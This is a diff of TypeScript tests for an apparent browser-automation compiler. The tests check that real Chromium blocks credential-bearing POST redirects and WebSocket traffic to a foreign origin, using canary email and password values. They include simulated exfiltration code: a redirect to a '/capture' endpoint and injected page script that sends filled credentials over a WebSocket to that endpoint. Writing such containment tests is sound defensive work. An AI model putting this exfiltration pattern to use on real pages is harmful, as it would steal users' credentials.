@@ -17,16 +17,31 @@ afterEach(async () => {
   await Promise.all(cleanups.splice(0).map((cleanup) => cleanup()));
 });
 
-test('real Chromium aborts a foreign-origin navigation redirect before credential bytes leave the approved origin', async () => {
+test('real Chromium blocks a credential-bearing POST redirect without leaking canaries to the foreign origin', async () => {
   const foreignRequests: string[] = [];
+  const foreignBytes: Buffer[] = [];
   const foreign = createServer((request, response) => {
     foreignRequests.push(`${request.method} ${request.url}`);
+    request.on('data', (chunk: Buffer) => foreignBytes.push(chunk));
     response.end('foreign');
   });
   const foreignOrigin = await listen(foreign);
-  const approved = createServer((_request, response) => {
-    response.writeHead(302, { location: `${foreignOrigin}/capture` });
-    response.end();
+  const approvedPosts: Buffer[] = [];
+  const approved = createServer((request, response) => {
+    if (request.method === 'POST') {
+      request.on('data', (chunk: Buffer) => approvedPosts.push(chunk));
+      request.on('end', () => {
+        response.writeHead(302, { location: `${foreignOrigin}/capture` });
+        response.end();
+      });
+      return;
+    }
+    response.writeHead(200, { 'content-type': 'text/html' });
+    response.end(`<!doctype html><form method="post" action="/login">
+      <label>Email <input name="email" /></label>
+      <label>Password <input name="password" type="password" /></label>
+      <button type="submit">Log in</button>
+    </form>`);
   });
   const approvedOrigin = await listen(approved);
   const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-redirect-'));
@@ -55,7 +70,83 @@ test('real Chromium aborts a foreign-origin navigation redirect before credentia
   }
 
   expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
+  const approvedPostBody = Buffer.concat(approvedPosts).toString('utf8');
+  expect(approvedPostBody).toContain('egress-canary%40example.test');
+  expect(approvedPostBody).toContain('EgressCanary9%21');
   expect(foreignRequests).toEqual([]);
+  const leakedForeignBytes = Buffer.concat(foreignBytes).toString('utf8');
+  expect(leakedForeignBytes).not.toContain('egress-canary@example.test');
+  expect(leakedForeignBytes).not.toContain('EgressCanary9!');
+}, 120_000);
+
+test('real Chromium blocks foreign WebSocket egress after credential canaries are filled', async () => {
+  const emailCanary = 'websocket-canary@example.test';
+  const passwordCanary = 'WebSocketCanary9!';
+  let foreignConnections = 0;
+  const foreignBytes: Buffer[] = [];
+  const foreign = createServer();
+  foreign.on('upgrade', (_request, socket, head) => {
+    foreignConnections += 1;
+    foreignBytes.push(head);
+    socket.on('data', (chunk: Buffer) => foreignBytes.push(chunk));
+    socket.destroy();
+  });
+  const foreignOrigin = await listen(foreign);
+  const foreignWebSocketOrigin = foreignOrigin.replace(/^http/u, 'ws');
+  const approved = createServer((_request, response) => {
+    response.writeHead(200, { 'content-type': 'text/html' });
+    response.end(`<!doctype html>
+      <label>Email <input aria-label="Email" /></label>
+      <label>Password <input aria-label="Password" type="password" /></label>`);
+  });
+  const approvedOrigin = await listen(approved);
+  const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-websocket-'));
+  cleanups.push(() => rm(directory, { recursive: true }));
+
+  await new PlaywrightCompiler({ outputDirectory: directory, origin: approvedOrigin }).compile(
+    loginWorkflow(),
+    observations(`${approvedOrigin}/login`),
+  );
+  await ensurePlaywrightModule(directory);
+  await writeFile(
+    join(directory, 'tests/workflow.spec.ts'),
+    `import { test, expect, configureApprovedOrigins, enforceNetworkContainment } from '../fixtures/workflow.fixture';
+configureApprovedOrigins([${JSON.stringify(approvedOrigin)}]);
+test('websocket credential egress', async ({ page, context }) => {
+  await page.goto(${JSON.stringify(`${approvedOrigin}/login`)});
+  await page.getByLabel('Email').fill(process.env.ARXIC_INPUT_PERSONA_EMAIL ?? '');
+  await page.getByLabel('Password').fill(process.env.ARXIC_INPUT_PERSONA_PASSWORD ?? '');
+  await expect(enforceNetworkContainment(context, () => page.evaluate(({ url, email, password }) => new Promise((resolve) => {
+    const socket = new WebSocket(url);
+    socket.addEventListener('open', () => { socket.send(JSON.stringify({ email, password })); resolve('opened'); });
+    socket.addEventListener('close', () => resolve('closed'));
+    socket.addEventListener('error', () => resolve('error'));
+  }), { url: ${JSON.stringify(`${foreignWebSocketOrigin}/capture`)}, email: process.env.ARXIC_INPUT_PERSONA_EMAIL, password: process.env.ARXIC_INPUT_PERSONA_PASSWORD }))).rejects.toThrow('ARXIC-COMPILE-ORIGIN-DENIED');
+});
+`,
+  );
+
+  let output = '';
+  try {
+    await execute(process.execPath, [resolvePlaywrightCli(), 'test'], {
+      cwd: directory,
+      env: {
+        ...process.env,
+        ARXIC_INPUT_PERSONA_EMAIL: emailCanary,
+        ARXIC_INPUT_PERSONA_PASSWORD: passwordCanary,
+      },
+      timeout: 120_000,
+    });
+  } catch (error) {
+    const failure = error as { stdout?: string; stderr?: string };
+    output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`;
+  }
+
+  expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
+  expect(foreignConnections).toBe(0);
+  const leakedForeignBytes = Buffer.concat(foreignBytes).toString('utf8');
+  expect(leakedForeignBytes).not.toContain(emailCanary);
+  expect(leakedForeignBytes).not.toContain(passwordCanary);
 }, 120_000);
 
 test('generated policy blocks service workers and installs context interception before navigation', async () => {
@@ -101,7 +192,8 @@ test('real Chromium blocks a page-context cross-origin fetch and service worker 
   await ensurePlaywrightModule(directory);
   await writeFile(
     join(directory, 'tests/workflow.spec.ts'),
-    `import { test, expect, enforceNetworkContainment } from '../fixtures/workflow.fixture';
+    `import { test, expect, configureApprovedOrigins, enforceNetworkContainment } from '../fixtures/workflow.fixture';
+configureApprovedOrigins([${JSON.stringify(approvedOrigin)}]);
 test('page egress', async ({ page, context }) => {
   await page.goto(${JSON.stringify(approvedOrigin)});
   await page.evaluate(() => navigator.serviceWorker.register('/sw.js').catch(() => undefined));
